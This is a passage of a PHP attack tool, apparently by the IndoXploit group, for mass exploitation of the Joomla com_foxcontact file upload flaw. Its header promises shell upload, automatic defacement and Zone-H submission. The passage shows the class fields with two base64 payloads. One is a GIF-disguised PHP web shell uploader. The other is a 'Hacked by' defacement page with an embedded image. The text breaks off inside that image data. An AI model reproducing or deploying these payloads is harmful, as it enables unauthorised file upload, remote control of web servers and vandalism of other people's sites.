<?php
/**

Joomla Component com_foxcontact Arbitrary File Upload
https://cxsecurity.com/issue/WLB-2016050072

Auto Exploiter (Shell Upload, Auto Deface, and Auto Submit Zone -H)
Coded by: L0c4lh34rtz - IndoXploit
http://www.indoxploit.or.id/2017/12/joomla-component-comfoxcontact.html

*/

error_reporting(0);
set_time_limit(0);

Class IDX_Foxcontact {
	public  $url;
	private $hacker;
	private $file = [];

	/* script uploader, sebaiknya jangan di otak-atik */
	private $uploader  = 'R0lGODlhOw0KPGh0bWw+DQo8dGl0bGU+VXBsb2FkZXIgQnkgSW5kb1hwbG9pdCBCT1Q8L3RpdGxlPg0KPHA+PD9waHAgZWNobyAnPGI+Jy5waHBfdW5hbWUoKS4nPC9iPic7ID8+PGJyPg0KPD9waHAgZWNobyAnPGI+Jy5nZXRjd2QoKS4nPC9iPic7ID8+PC9wPg0KPGZvcm0gbWV0aG9kPSdwb3N0JyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz4NCjxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSdpZHhfZmlsZSc+DQo8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0ndXBsb2FkJyBuYW1lPSd1cGxvYWQnPg0KPC9mb3JtPg0KPD9waHAgaWYoaXNzZXQoJF9QT1NUWyd1cGxvYWQnXSkpIHsgaWYoQGNvcHkoJF9GSUxFU1snaWR4X2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snaWR4X2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvJF9GSUxFU1snaWR4X2ZpbGUnXVsnbmFtZSddLiAnWzxiPk9LPC9iPl0nOyB9IGVsc2UgeyBlY2hvJF9GSUxFU1snaWR4X2ZpbGUnXVsnbmFtZSddLiAnWzxiPkZBSUxFRDwvYj4nOyB9IH0gPz4=';
		
	/* script deface, ubah bagian ini ke base64 script deface kalian */
	private $deface    = 'PHRpdGxlPkhhY2tlZCBieSBQYXRhbjQwNDwvdGl0bGU+PGJvZHkgYmdjb2xvcj1ibGFjaz48Y2VudGVyPjxpbWcgc3JjPSJkYXRhOmltYWdlL2pwZztiYXNlNjQsLzlqLzRRMWJSWGhwWmdBQVRVMEFLZ0FBQUFnQURBRUFBQU1BQUFBQkFhUUFBQUVCQUFNQUFBQUJBUVlBQUFFQ0FBTUFBQUFEQUFBQW5nRUdBQU1BQUFBQkFBSUFBQUVTQUFNQUFBQUJBQUVBQUFFVkFBTUFBQUFCQUFNQUFBRWFBQVVBQUFBQkFBQUFwQUViQUFVQUFBQUJBQUFBckFFb0FBTUFBQUFCQUFJQUFBRXhBQUlBQUFBY0FBQUF0QUV5QUFJQUFBQVVBQUFBMElkcEFBUUFBQUFCQUFBQTVBQUFBUndBQ0FBSUFBZ0FDdnlBQUFBbkVBQUsvSUFBQUNjUVFXUnZZbVVnVUdodmRHOXphRzl3SUVOVE5TQlhhVzVrYjNkekFESXdNVFE2TURNNk1ESWdNVFU2TkRRNk1ETUFBQVNRQUFBSEFBQUFCREF5TWpHZ0FRQURBQUFBQWYvL0FBQ2dBZ0FFQUFBQUFRQUFBYVNnQXdBRUFBQUFBUUFBQVFZQUFBQUFBQUFBQmdFREFBTUFBQUFCQUFZQUFBRWFBQVVBQUFBQkFBQUJhZ0ViQUFVQUFBQUJBQUFCY2dFb0FBTUFBQUFCQUFJQUFBSUJBQVFBQUFBQkFBQUJlZ0lDQUFRQUFBQUJBQUFMMlFBQUFBQUFBQUJJQUFBQUFRQUFBRWdBQUFBQi85ai83UUFNUVdSdlltVmZRMDBBQXYvdUFBNUJaRzlpWlFCa2dBQUFBQUgvMndDRUFBd0lDQWdKQ0F3SkNRd1JDd29MRVJVUERBd1BGUmdURXhVVEV4Z1JEQXdNREF3TUVRd01EQXdNREF3TURBd01EQXdNREF3TURBd01EQXdNREF3TURBd0JEUXNMRFE0TkVBNE9FQlFPRGc0VUZBNE9EZzRVRVF3TURBd01FUkVNREF3TURBd1JEQXdNREF3TURBd01EQXdNREF3TURBd01EQXdNREF3TURBd01EUC9BQUJFSUFHUUFvQU1CSWdBQ0VRRURFUUgvM1FBRUFBci94QUUvQUFBQkJRRUJBUUVCQVFBQUFBQUFBQUFEQUFFQ0JBVUdCd2dKQ2dzQkFBRUZBUUVCQVFFQkFBQUFBQUFBQUFFQUFnTUVCUVlIQ0FrS0N4QUFBUVFCQXdJRUFnVUhCZ2dGQXd3ekFRQUNFUU1FSVJJeEJVRlJZUk1pY1lFeUJoU1JvYkZDSXlRVlVzRmlNelJ5Z3RGREJ5V1NVL0RoOFdOek5SYWlzb01tUkpOVVpFWENvM1EyRjlKVjRtWHlzNFREMDNYajgwWW5sS1NGdEpYRTFPVDBwYlhGMWVYMVZtWjJocGFtdHNiVzV2WTNSMWRuZDRlWHA3ZkgxK2YzRVFBQ0FnRUNCQVFEQkFVR0J3Y0dCVFVCQUFJUkF5RXhFZ1JCVVdGeEloTUZNb0dSRktHeFFpUEJVdEh3TXlSaTRYS0Nra05URldOek5QRWxCaGFpc29NSEpqWEMwa1NUVktNWFpFVlZOblJsNHZLemhNUFRkZVB6UnBTa2hiU1Z4TlRrOUtXMXhkWGw5VlptZG9hV3ByYkcxdWIySnpkSFYyZDNoNWVudDhmLzJnQU1Bd0VBQWhFREVRQS9BUEtra2trbE1xeEx3RjBIU1hqN2Zqc2VBV3RyTno1N2J5eDNqK2JUV3hZRlg4NFB4K0N2NGRydld1czFQdGF3a2Z1OE9IL1JTVTErb1diclhObWYwbGppZkV1ZVIvMUxHcjZKK3FmU0c5RytybUIwL2J0ZlZTMDNmOGEvOUxmL0FPQ3Zjdm5mQXFHWDFYRm9JMHZ2WXlQNjd3My9BTDh2cFhONmpqNFRDNnh0bGhBM09aU3gxanczOThzckRuYkVsTnBjbjlkYWN6cHI2ZnJUMHdIMWNIYXpxTmJRWGVyaWJ0em51cmFQYy9DZitsM2ZvLzFleksvU0s1VDlmUHFwYS8wM1o3YUxKamJlMTlXdnh0YTFxMm0yWXVYUWRqcThpaXdFT2doN0hOUHRjRDlKcm11U1U4UjliT2tZZjE2NkZUbGRLY3c5VXgyRy9EOTIzMUdFL3BhR3ZPMXZwMnUvbW52L0FLUGtmb2IvQUxOdnZYajJYVmJEcm5WZWpaVTcwY3VvKzF3c0V5NTlKaDFlL1o3L0FQaGw2bS9IeVBxVjFuN05WVzZ6cE9XOG5FQUxuN2dSL1JKSjlTcnFlRzMraWZwUDhwWVBwNDNxZmFhYXFsVyt1bjFVcDZ6U1ByTjBBTnV5cm1IN1hpVm5lekpZTkxMY1p6UTEzMnluYitteDNNcnlQMGZxK2xYbDAvckNVK1ZPYVJFOXhJK0NaVC9SOGE3Q1phZVNQNnlnNXBhWU9oQ1NsSkpKSktVa2tra3BTU1NTU2xKSkpKS2YvOUR5cEpKSkpTN1RCUnE3Q0cyeCtjSmo3MEFLYkhHVDV0SS9CSlRwZlZOdS93Q3RQUjI4ZzUyTlB3OVd0ZlNUV3NZWFJ5NHlUM0pYenovaSt4L3RIMXo2VFh6dHY5VC9BTGFhNi84QTlGcjNmcjFIVkxlbVh0NlM4TXpITklZNDZIWDl4eDlySC95a2xOSHJuMWYrcXZXVFpWbTAxL2FqOUxJcEFGN0hkbkd4alhlLytSZHZYQzVYMUU2djB1OFhmVlRyb2Zjd2J2czVzOUc0aitTd085Qy8vcmpLbFl4L3FaMWpQNkIxREt6T28zdjZuVjZwcTZkaVBMYW1XczBkWFpBM1g1RDlqZGpHdnJyL0FKcjZiRnkvVWZxN2ozOVhmK3dMSHV3OWxEY0Jqck4rUlphNFZ0dTNVeDZsSHB2KzBYNVhxZW42SDhqK2JTVTlGVDEzcmZWTnYxYSt1ZlM3dlN5bkJqTTJ0aGJaVmJQNkxKcWMxcnFuK20vOXovejMralZyQUhXK2hkV2QwN0toK2E4YnE0T3lucU5iQ1AwK1B1bGpPcjQ3ZHZyVXUvbnYrMmNoYUgxWHlPcVllYmQwaTdKc3kyVWZSZllkendEdzE3dnBQWTVuK2svU00vNHY2SFY5VDZKaGRYd1RpWjlXOWtoOWJtbmJaWFkzK2J5TWU1dnZwdXIvQUgvKytKS2ZOZnJmOVU4RHJWTHVzZEgyVjlSZDc4aWdlMXR4amRhN1k3YjZPVisvN1dlci9oUDB2Nld6emE2dTJxeDFON1hNdHI5cFk0UVFSK2E1cFhmZlhQOEFhM1FjbDFlWFljamVmMFdlMEFlczJQNXZQby9NeTYvKzVWUDgvd0Q5dXJrMlY1L1hNaWpIcFk3SnlibmJLS2g5TW40L3VOL1BzZDdHZjRSSlRrcEsxbDlQc3hqVzB1RDdYQjV0b0FkdnBjeDdxbjFaRzlqRytwN04zczNxcWtwU1NTU1NsSkpKSktVa2tra3AvOUh5cEpKU3IyYjI3L296ckNTbUtkcnRwbEZ1eDdHTzRscDFZUnFDT2RJUVVsUFkvd0NLYXNQK3V1TTQvd0NDcXVjUCsyM1Yvd0RmMTd3dkJmOEFGUmVLdnJyaU1QOEFocTdxeDhmVGZiLzZMWHZJY0NrcHAzOU5hYjM1V080MVpGZ2g3Mm5tQjdaWjlCVXYyZm5tNnl4MWpTYkQ3bmVsVzEwZnVHeG8zUGIvQUZsdFNtMnpxN1ZKVG5ZWFNjZW0vd0MwbGpUZDNzMmpjZE5zYm9XbW1VWFBBQm5TRWxQa3YrT054ZGs0ekJ3Tlo3YWhZZjFmNlRpMzBOeWNaNXg4NnMreXdlNXBiRVI2YnR2L0FJRlpWWXR6L0c2UysyaTBhaXYybjRIdXVZK3ErYUszR3FTV3pJQ1NtNTlZT201dDkxbVprczNYdmoxYnE1Y3g4Q056dHo5Mi93RDQ1Y2hheDdIa1BidE04UkM5U2RkWFl3c3RFenlmNExqdnJWaFUwVnRmVVpCZE1ubitxa3A1dEpKSkpTa2tra2xLU1NTU1UvL1M4cVNTU1NVMjhMSWVJcGNRNWpqdGFINmdGMzd2N3FOWlJWYnlHMVdqMmthbGpuRS92TitodzcyS25pZ091YnUraTA3bmQ5QjVLNVk2V2hydHJybXRnZ21OSkcxMVZqZnBNYzFKU2JwbDJYMHZNcXk4TGJYa1k5Z3NxdmR5M1NQb3p0OU94ci96L3BydmVuLzQxZXFWWkRSMUxIb3R4aTBiL1FtdXhwOTJyZDc3R1didG45SDlQZXZOclRZMXovVFk5bzl6U0JyN1oydmE0dCtsdGVtRDdMQThOSjNPamMxeEV6KzlxR3BLZlhzdi9IQjBlbGhaaFlkK1hrYmR3WTR0cVlSei9PbjFYdTl2dTl0S3hzai9BQno5V2U2TVhwK05TMnpTdDFyMzJiWGY4S0cvWnY2cTg1OUo5amd4clhFdTBZMGtBZy9TTGRUL0FOOVRDdHJpdyswQndMVHVjSWtENlhzM2JVbFBZWlgrTm42MzMxSDBzaWpGc1lZaW1scnR3L2VIMmc1SC9VcW4vd0NPVDljeFpZVzlVZHRkN210ZFhVN1g2T3h2NkQ5MytvdWFMSEZyWGw3WkI5TWlDU09mcDZmNWljc0RXSDNBK25aQUJicHIrYy8vQURVbE9yMWo2MTlaNjNVeXZxRHE3R2tnRmxkYldPbG9qZDdCdjl5ek1USmRpWHV0cmtoaGpiNGo0aER0YXdHd05jMGdPRUVTSkIvY1k3ODMrc2h1QUJJMUE1QTVTVTlDejZ5MXg3dDRJQTBPc3JPNnAxSjJhUTBPQllOZS9QeldhU1NaUEtTU2xKSkpKS1Vra2trcFNTU1NTbi8vMC9La2tra2xNNnJQVHNEdnZWdVFSdERRK3MvUnFlZTh0L21iZjVYN3FvbzlUcFlBNzZJbVoxR21xU21mc0IydWMrb3VQQkFPamp0Yzc4ejgxVDN2UDB0dHcxSkIxTXUvUmJvZC9oTjJ4NllrdDBFUkdqWCs1cC9OL1J1UDBYZTc2TDFBK2tBUStzMXVNNmd4MjI3VDlMMitvRWxNckdQWVhOOU56UHBBbjNSdlpvNzZPOXJsRXZiRGl5d2c2T2JMdFpQMDJ1OXJkemxPdmVYTjlPd0hYUU85djBtdzR5ejk3YW1MN1N6M01jNXZwUURvNkdnN21uajJNM0pLVTVvRy93RFNQaHJ3VHdZQi93QUk3YTc2ZTc4eFFzYnROamQ3bkJqcEFjMDZpZjV4L3dDNms5MUJMcGFCdTJFYUZzRDgrR3QzdC90cFdoaDlVMXp0M0NJZElqOTMzZTU3a2xNTEg3alo3OTI2REpiQlAva0dvWmp5OEJDSlp1SnNKM2tpSkpNNmZ5eWh1NVA1Q2twWkZlS3lLNjZ4N2dKc2VlN2pyL1paVzFDU1NVcUVraVNUSlNTVXBKSkpKU2tra2tsUC85VHlwSkpKSlNrU2x4QklIUEkrSS84QU1keUduYVNIQWd3UndVbE5rRUVRWWMzd1BCai9BS1c3YitlbzZzL20zRUVSK2pmOE4zOVhhazEwRWdjY2hvME1mVDI3ditDY21jNEVFazd1NGRHaDVEZitMY2twYzdSclpYdDRoelQzK256N21iOXJrNG5iTFhnZ05kTzd2Sjl3RzMzTy9mOEFjb0J4YkpZUzBHUVI5SWFqVWJtL3ZKK1NTNW9mejdtLzVrKzJQODFKU1N3NUIzN2dYQWxySHVCRGdYRDNlZmdodmRXNHYwRzR2R2hHMHg0ZTA3V0tUTlhqMDNRUzVzQi9JSUg3N2Y1WHQraWtDNCttSGJnSE8zZG5EK3l4SlNKNEFMd0FEN29HMHlQN0NpN1F1QmtHZkdVNU80OGc3bkVtUkh6SlVFbEtQS1NTU1NsSkpKSktVa2tra3BTU1NTU24vOVh5cEpKSkpTa2tra2xKUk1IZDh2SGQvSlVqdTE5UDZVRDFZK2pNOTBCSkpUTjhiajZmRTZSeW5idWtiWm1kSTVtTzBJYVNTbXorWittbmQvZzUrbFBiL3JmMGxGdkEzL3VPalo5TG4vQ0lDU1NsenVoczhSb21TU1NVcEpKSkpTa2tra2xLU1NTU1VwSkpKSlQvQVAvWi8rMFVtbEJvYjNSdmMyaHZjQ0F6TGpBQU9FSkpUUVFFQUFBQUFBQVBIQUZhQUFNYkpVY2NBZ0FBQW91WkFEaENTVTBFSlFBQUFBQUFFRCtTRWttbm1XY1BiYmNzZlNBUmlTazRRa2xOQkRvQUFBQUFBSk1BQUFBUUFBQUFBUUFBQUFBQUMzQnlhVzUwVDNWMGNIVjBBQUFBQlFBQUFBQkRiSEpUWlc1MWJRQUFBQUJEYkhKVEFBQUFBRkpIUWtNQUFBQUFTVzUwWldWdWRXMEFBQUFBU1c1MFpRQUFBQUJEYkhKdEFBQUFBRTF3UW14aWIyOXNBUUFBQUE5d2NtbHVkRk5wZUhSbFpXNUNhWFJpYjI5c0FBQUFBQXR3Y21sdWRHVnlUbUZ0WlZSRldGUUFBQUFCQUFBQU9FSkpUUVE3QUFBQUFBR3lBQUFBRUFBQUFBRUFBQUFBQUJKd2NtbHVkRTkxZEhCMWRFOXdkR2x2Ym5NQUFBQVNBQUFBQUVOd2RHNWliMjlzQUFBQUFBQkRiR0p5WW05dmJBQUFBQUFBVW1kelRXSnZiMndBQUFBQUFFTnlia05pYjI5c0FBQUFBQUJEYm5SRFltOXZiQUFBQUFBQVRHSnNjMkp2YjJ3QUFBQUFBRTVuZEhaaWIyOXNBQUFBQUFCRmJXeEVZbTl2YkFBQUFBQUFTVzUwY21KdmIyd0FBQUFBQUVKamEyZFBZbXBqQUFBQUFRQUFBQUFBQUZKSFFrTUFBQUFEQUFBQUFGSmtJQ0JrYjNWaVFHL2dBQUFBQUFBQUFBQUFSM0p1SUdSdmRXSkFiK0FBQUFBQUFBQUFBQUJDYkNBZ1pHOTFZa0J2NEFBQUFBQUFBQUFBQUVKeVpGUlZiblJHSTFKc2RBQUFBQUFBQUFBQUFBQUFBRUpzWkNCVmJuUkdJMUpzZEFBQUFBQUFBQUFBQUFBQUFGSnpiSFJWYm5SR0kxQjRiRUJTQUFBQUFBQUFBQUFBQ25abFkzUnZja1JoZEdGaWIyOXNBUUFBQUFCUVoxQnpaVzUxYlFBQUFBQlFaMUJ6QUFBQUFGQm5VRU1BQUFBQVRHVm1kRlZ1ZEVZalVteDBBQUFBQUFBQUFBQUFBQUFBVkc5d0lGVnVkRVlqVW14MEFBQUFBQUFBQUFBQUFBQUFVMk5zSUZWdWRFWWpVSEpqUUZrQUFBQUFBQUE0UWtsTkErMEFBQUFBQUJBQVNBQUFBQUVBQWdCSUFBQUFBUUFDT0VKSlRRUW1BQUFBQUFBT0FBQUFBQUFBQUFBQUFEK0FBQUE0UWtsTkJBMEFBQUFBQUFRQUFBQWVPRUpKVFFRWkFBQUFBQUFFQUFBQUhqaENTVTBEOHdBQUFBQUFDUUFBQUFBQUFBQUFBUUE0UWtsTkp4QUFBQUFBQUFvQUFRQUFBQUFBQUFBQ09FSkpUUVAxQUFBQUFBQklBQzltWmdBQkFHeG1aZ0FHQUFBQUFBQUJBQzltWmdBQkFLR1ptZ0FHQUFBQUFBQUJBRElBQUFBQkFGb0FBQUFHQUFBQUFBQUJBRFVBQUFBQkFDMEFBQUFHQUFBQUFBQUJPRUpKVFFQNEFBQUFBQUJ3QUFELy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy9BK2dBQUFBQS8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vd1BvQUFBQUFQLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLzhENkFBQUFBRC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vQStnQUFEaENTVTBFQ0FBQUFBQUFFQUFBQUFFQUFBSkFBQUFDUUFBQUFBQTRRa2xOQkI0QUFBQUFBQVFBQUFBQU9FSkpUUVFhQUFBQUFBTzdBQUFBQmdBQUFBQUFBQUFBQUFBQkJnQUFBYVFBQUFCREFIY0Fid0J0QUdVQWJnQWdBR0lBYkFCMUFHVUFJQUJsQUhrQVpRQnpBQ0FBY3dCakFHRUFjZ0JtQUNBQU1RQTBBRFFBTUFCNEFEa0FNQUF3QUNBQWR3QmhBR3dBYkFCd0FHRUFjQUJsQUhJQVh3QjNBSGNBZHdBdUFHMEFhUUJ6QUdNQVpRQnNBR3dBWVFCdUFHVUFid0IxQUhNQWFBQnBBQzRBWXdCdkFHMEFYd0E1QURFQUFBQUJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUVBQUFBQUFBQUFBQUFBQWFRQUFBRUdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBRUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFFQUFBQUFFQUFBQUFBQUJ1ZFd4c0FBQUFBZ0FBQUFaaWIzVnVaSE5QWW1wakFBQUFBUUFBQUFBQUFGSmpkREVBQUFBRUFBQUFBRlJ2Y0NCc2IyNW5BQUFBQUFBQUFBQk1aV1owYkc5dVp3QUFBQUFBQUFBQVFuUnZiV3h2Ym1jQUFBRUdBQUFBQUZKbmFIUnNiMjVuQUFBQnBBQUFBQVp6YkdsalpYTldiRXh6QUFBQUFVOWlhbU1BQUFBQkFBQUFBQUFGYzJ4cFkyVUFBQUFTQUFBQUIzTnNhV05sU1VSc2IyNW5BQUFBQUFBQUFBZG5jbTkxY0VsRWJHOXVad0FBQUFBQUFBQUdiM0pwWjJsdVpXNTFiUUFBQUF4RlUyeHBZMlZQY21sbmFXNEFBQUFOWVhWMGIwZGxibVZ5WVhSbFpBQUFBQUJVZVhCbFpXNTFiUUFBQUFwRlUyeHBZMlZVZVhCbEFBQUFBRWx0WnlBQUFBQUdZbTkxYm1SelQySnFZd0FBQUFFQUFBQUFBQUJTWTNReEFBQUFCQUFBQUFCVWIzQWdiRzl1WndBQUFBQUFBQUFBVEdWbWRHeHZibWNBQUFBQUFBQUFBRUowYjIxc2IyNW5BQUFCQmdBQUFBQlNaMmgwYkc5dVp3QUFBYVFBQUFBRGRYSnNWRVZZVkFBQUFBRUFBQUFBQUFCdWRXeHNWRVZZVkFBQUFBRUFBQUFBQUFCTmMyZGxWRVZZVkFBQUFBRUFBQUFBQUFaaGJIUlVZV2RVUlZoVUFBQUFBUUFBQUFBQURtTmxiR3hVWlhoMFNYTklWRTFNWW05dmJBRUFBQUFJWTJWc2JGUmxlSFJVUlZoVUFBQUFBUUFBQUFBQUNXaHZjbnBCYkdsbmJtVnVkVzBBQUFBUFJWTnNhV05sU0c5eWVrRnNhV2R1QUFBQUIyUmxabUYxYkhRQUFBQUpkbVZ5ZEVGc2FXZHVaVzUxYlFBQUFBOUZVMnhwWTJWV1pYSjBRV3hwWjI0QUFBQUhaR1ZtWVhWc2RBQUFBQXRpWjBOdmJHOXlWSGx3WldWdWRXMEFBQUFSUlZOc2FXTmxRa2REYjJ4dmNsUjVjR1VBQUFBQVRtOXVaUUFBQUFsMGIzQlBkWFJ6WlhSc2IyNW5BQUFBQUFBQUFBcHNaV1owVDNWMGMyVjBiRzl1WndBQUFBQUFBQUFNWW05MGRHOXRUM1YwYzJWMGJHOXVad0FBQUFBQUFBQUxjbWxuYUhSUGRYUnpaWFJzYjI1bkFBQUFBQUE0UWtsTkJDZ0FBQUFBQUF3QUFBQUNQL0FBQUFBQUFBQTRRa2xOQkJFQUFBQUFBQUVCQURoQ1NVMEVGQUFBQUFBQUJBQUFBQUU0UWtsTkJBd0FBQUFBQy9VQUFBQUJBQUFBb0FBQUFHUUFBQUhnQUFDN2dBQUFDOWtBR0FBQi85ai83UUFNUVdSdlltVmZRMDBBQXYvdUFBNUJaRzlpWlFCa2dBQUFBQUgvMndDRUFBd0lDQWdKQ0F3SkNRd1JDd29MRVJVUERBd1BGUmdURXhVVEV4Z1JEQXdNREF3TUVRd01EQXdNREF3TURBd01EQXdNREF3TURBd01EQXdNREF3TURBd0JEUXNMRFE0TkVBNE9FQlFPRGc0VUZBNE9EZzRVRVF3TURBd01FUkVNREF3TURBd1JEQXdNREF3TURBd01EQXdNREF3TURBd01EQXdNREF3TURBd01EUC9BQUJFSUFHUUFvQU1CSWdBQ0VRRURFUUgvM1FBRUFBci94QUUvQUFBQkJRRUJBUUVCQVFBQUFBQUFBQUFEQUFFQ0JBVUdCd2dKQ2dzQkFBRUZBUUVCQVFFQkFBQUFBQUFBQUFFQUFnTUVCUVlIQ0FrS0N4QUFBUVFCQXdJRUFnVUhCZ2dGQXd3ekFRQUNFUU1FSVJJeEJVRlJZUk1pY1lFeUJoU1JvYkZDSXlRVlVzRmlNelJ5Z3RGREJ5V1NVL0RoOFdOek5SYWlzb01tUkpOVVpFWENvM1EyRjlKVjRtWHlzNFREMDNYajgwWW5sS1NGdEpYRTFPVDBwYlhGMWVYMVZtWjJocGFtdHNiVzV2WTNSMWRuZDRlWHA3ZkgxK2YzRVFBQ0FnRUNCQVFEQkFVR0J3Y0dCVFVCQUFJUkF5RXhFZ1JCVVdGeEloTUZNb0dSRktHeFFpUEJVdEh3TXlSaTRYS0Nra05URldOek5QRWxCaGFpc29NSEpqWEMwa1NUVktNWFpFVlZOblJsNHZLemhNUFRkZVB6UnBTa2hiU1Z4TlRrOUtXMXhkWGw5VlptZG9hV3ByYkcxdWIySnpkSFYyZDNoNWVudDhmLzJnQU1Bd0VBQWhFREVRQS9BUEtra2trbE1xeEx3RjBIU1hqN2Zqc2VBV3RyTno1N2J5eDNqK2JUV3hZRlg4NFB4K0N2NGRydld1czFQdGF3a2Z1OE9IL1JTVTErb1diclhObWYwbGppZkV1ZVIvMUxHcjZKK3FmU0c5RytybUIwL2J0ZlZTMDNmOGEvOUxmL0FPQ3Zjdm5mQXFHWDFYRm9JMHZ2WXlQNjd3My9BTDh2cFhONmpqNFRDNnh0bGhBM09aU3gxanczOThzckRuYkVsTnBjbjlkYWN6cHI2ZnJUMHdIMWNIYXpxTmJRWGVyaWJ0em51cmFQYy9DZitsM2ZvLzFleksvU0s1VDlmUHFwYS8wM1o3YUxKamJlMTlXdnh0YTFxMm0yWXVYUWRqcThpaXdFT2doN0hOUHRjRDlKcm11U1U4UjliT2tZZjE2NkZUbGRLY3c5VXgyRy9EOTIzMUdFL3BhR3ZPMXZwMnUvbW52L0FLUGtmb2IvQUxOdnZYajJYVmJEcm5WZWpaVTcwY3VvKzF3c0V5NTlKaDFlL1o3L0FQaGw2bS9IeVBxVjFuN05WVzZ6cE9XOG5FQUxuN2dSL1JKSjlTcnFlRzMraWZwUDhwWVBwNDNxZmFhYXFsVyt1bjFVcDZ6U1ByTjBBTnV5cm1IN1hpVm5lekpZTkxMY1p6UTEzMnluYitteDNNcnlQMGZxK2xYbDAvckNVK1ZPYVJFOXhJK0NaVC9SOGE3Q1phZVNQNnlnNXBhWU9oQ1NsSkpKSktVa2tra3BTU1NTU2xKSkpKS2YvOUR5cEpKSkpTN1RCUnE3Q0cyeCtjSmo3MEFLYkhHVDV0SS9CSlRwZlZOdS93Q3RQUjI4ZzUyTlB3OVd0ZlNUV3NZWFJ5NHlUM0pYenovaSt4L3RIMXo2VFh6dHY5VC9BTGFhNi84QTlGcjNmcjFIVkxlbVh0NlM4TXpITklZNDZIWDl4eDlySC95a2xOSHJuMWYrcXZXVFpWbTAxL2FqOUxJcEFGN0hkbkd4alhlLytSZHZYQzVYMUU2djB1OFhmVlRyb2Zjd2J2czVzOUc0aitTd085Qy8vcmpLbFl4L3FaMWpQNkIxREt6T28zdjZuVjZwcTZkaVBMYW1XczBkWFpBM1g1RDlqZGpHdnJyL0FKcjZiRnkvVWZxN2ozOVhmK3dMSHV3OWxEY0Jqck4rUlphNFZ0dTNVeDZsSHB2KzBYNVhxZW42SDhqK2JTVTlGVDEzcmZWTnYxYSt1ZlM3dlN5bkJqTTJ0aGJaVmJQNkxKcWMxcnFuK20vOXovejMralZyQUhXK2hkV2QwN0toK2E4YnE0T3lucU5iQ1AwK1B1bGpPcjQ3ZHZyVXUvbnYrMmNoYUgxWHlPcVllYmQwaTdKc3kyVWZSZllkendEdzE3dnBQWTVuK2svU00vNHY2SFY5VDZKaGRYd1RpWjlXOWtoOWJtbmJaWFkzK2J5TWU1dnZwdXIvQUgvKytKS2ZOZnJmOVU4RHJWTHVzZEgyVjlSZDc4aWdlMXR4amRhN1k3YjZPVisvN1dlci9oUDB2Nld6emE2dTJxeDFON1hNdHI5cFk0UVFSK2E1cFhmZlhQOEFhM1FjbDFlWFljamVmMFdlMEFlczJQNXZQby9NeTYvKzVWUDgvd0Q5dXJrMlY1L1hNaWpIcFk3SnlibmJLS2g5TW40L3VOL1BzZDdHZjRSSlRrcEsxbDlQc3hqVzB1RDdYQjV0b0FkdnBjeDdxbjFaRzlqRytwN04zczNxcWtwU1NTU1NsSkpKSktVa2tra3AvOUh5cEpKU3IyYjI3L296ckNTbUtkcnRwbEZ1eDdHTzRscDFZUnFDT2RJUVVsUFkvd0NLYXNQK3V1TTQvd0NDcXVjUCsyM1Yvd0RmMTd3dkJmOEFGUmVLdnJyaU1QOEFocTdxeDhmVGZiLzZMWHZJY0NrcHAzOU5hYjM1V080MVpGZ2g3Mm5tQjdaWjlCVXYyZm5tNnl4MWpTYkQ3bmVsVzEwZnVHeG8zUGIvQUZsdFNtMnpxN1ZKVG5ZWFNjZW0vd0MwbGpUZDNzMmpjZE5zYm9XbW1VWFBBQm5TRWxQa3YrT054ZGs0ekJ3Tlo3YWhZZjFmNlRpMzBOeWNaNXg4NnMreXdlNXBiRVI2YnR2L0FJRlpWWXR6L0c2UysyaTBhaXYybjRIdXVZK3ErYUszR3FTV3pJQ1NtNTlZT201dDkxbVprczNYdmoxYnE1Y3g4Q056dHo5Mi93RDQ1Y2hheDdIa1BidE04UkM5U2RkWFl3c3RFenlmNExqdnJWaFUwVnRmVVpCZE1ubitxa3A1dEpKSkpTa2tra2xLU1NTU1UvL1M4cVNTU1NVMjhMSWVJcGNRNWpqdGFINmdGMzd2N3FOWlJWYnlHMVdqMmthbGpuRS92TitodzcyS25pZ091YnUraTA3bmQ5QjVLNVk2V2hydHJybXRnZ21OSkcxMVZqZnBNYzFKU2JwbDJYMHZNcXk4TGJYa1k5Z3NxdmR5M1NQb3p0OU94ci96L3BydmVuLzQxZXFWWkRSMUxIb3R4aTBiL1FtdXhwOTJyZDc3R1didG45SDlQZXZOclRZMXovVFk5bzl6U0JyN1oydmE0dCtsdGVtRDdMQThOSjNPamMxeEV6KzlxR3BLZlhzdi9IQjBlbGhaaFlkK1hrYmR3WTR0cVlSei9PbjFYdTl2dTl0S3hzai9BQno5V2U2TVhwK05TMnpTdDFyMzJiWGY4S0cvWnY2cTg1OUo5amd4clhFdTBZMGtBZy9TTGRUL0FOOVRDdHJpdyswQndMVHVjSWtENlhzM2JVbFBZWlgrTm42MzMxSDBzaWpGc1lZaW1scnR3L2VIMmc1SC9VcW4vd0NPVDljeFpZVzlVZHRkN210ZFhVN1g2T3h2NkQ5MytvdWFMSEZyWGw3WkI5TWlDU09mcDZmNWljc0RXSDNBK25aQUJicHIrYy8vQURVbE9yMWo2MTlaNjNVeXZxRHE3R2tnRmxkYldPbG9qZDdCdjl5ek1USmRpWHV0cmtoaGpiNGo0aER0YXdHd05jMGdPRUVTSkIvY1k3ODMrc2h1QUJJMUE1QTVTVTlDejZ5MXg3dDRJQTBPc3JPNnAxSjJhUTBPQllOZS9QeldhU1NaUEtTU2xKSkpKS1Vra2trcFNTU1NTbi8vMC9La2tra2xNNnJQVHNEdnZWdVFSdERRK3MvUnFlZTh0L21iZjVYN3FvbzlUcFlBNzZJbVoxR21xU21mc0IydWMrb3VQQkFPamp0Yzc4ejgxVDN2UDB0dHcxSkIxTXUvUmJvZC9oTjJ4NllrdDBFUkdqWCs1cC9OL1J1UDBYZTc2TDFBK2tBUStzMXVNNmd4MjI3VDlMMitvRWxNckdQWVhOOU56UHBBbjNSdlpvNzZPOXJsRXZiRGl5d2c2T2JMdFpQMDJ1OXJkemxPdmVYTjlPd0hYUU85djBtdzR5ejk3YW1MN1N6M01jNXZwUURvNkdnN21uajJNM0pLVTVvRy93RFN